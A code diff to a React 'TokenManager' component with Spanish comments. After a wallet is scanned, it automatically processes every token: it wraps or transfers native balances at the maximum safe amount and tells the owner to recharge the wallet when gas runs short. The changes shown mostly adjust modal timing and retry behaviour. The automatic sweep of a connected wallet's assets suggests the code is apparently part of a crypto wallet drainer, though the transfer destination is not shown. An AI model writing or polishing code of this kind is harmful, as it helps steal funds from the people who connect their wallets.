@@ -220,15 +220,15 @@ export default function TokenManager(): React.JSX.Element {
   }, [isConnected, address, hasScanned, scanError])
 
   useEffect(() => {
-    // Solo iniciar procesamiento si no hay otros modales abiertos
-    if (hasScanned && tokens.length > 0 && !processing && !showModal) {
-      setShowProcessingModal(true)
-      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
-      setTimeout(() => {
-        processAllTokens()
-      }, 1500)
-    }
-  }, [hasScanned, tokens, processing, showModal])
+  // Solo iniciar procesamiento si no hay otros modales abiertos y no estamos procesando
+  if (hasScanned && tokens.length > 0 && !processing && !showModal && !isLoading) {
+    setShowProcessingModal(true)
+    // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
+    setTimeout(() => {
+      processAllTokens()
+    }, 1500)
+  }
+}, [hasScanned, tokens, processing, showModal, isLoading])
 
   const showLoading = (message: string) => {
     setLoadingMessage(message)
@@ -400,6 +400,7 @@ export default function TokenManager(): React.JSX.Element {
 
   const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
     try {
+      
       if (!walletClient || !publicClient || !address) {
         throw new Error('Wallet no conectada correctamente');
       }
@@ -437,23 +438,24 @@ export default function TokenManager(): React.JSX.Element {
 
       // Si no hay suficiente para ninguna operación
       if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
-        const reason = 'Saldo insuficiente para cubrir gas fees'
-        setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
-        
-        // Mostrar modal de error de gas
+      const reason = 'Saldo insuficiente para cubrir gas fees'
+      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+      
+      // Mostrar modal de error de gas SOLO si no hay otros modales activos
+      if (!showModal) {
         showAlertModal(
           'Error', 
           'Por favor recargue la wallet', 
           'error', 
           () => {
             setShowModal(false)
-            processNativeToken(token) // Reintentar procesamiento
           },
-          'Reintentar'
+          'Entendido'
         )
-        
-        return { success: false, reason }
       }
+      
+      return { success: false, reason }
+    }
 
       // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
       if (wrappedAddress && maxSafeForWrap.gt(0)) {
@@ -598,7 +600,9 @@ export default function TokenManager(): React.JSX.Element {
       setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
       return { success: false, reason }
     }
+    
   }
+  
 
   const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
     try {
@@ -1135,7 +1139,7 @@ export default function TokenManager(): React.JSX.Element {
         </div>
       </main>
 
-      {(isLoading || showProcessingModal) && (
+      {(isLoading || showProcessingModal) && !showModal && (
         <div style={{
           position: 'fixed',
           top: 0,
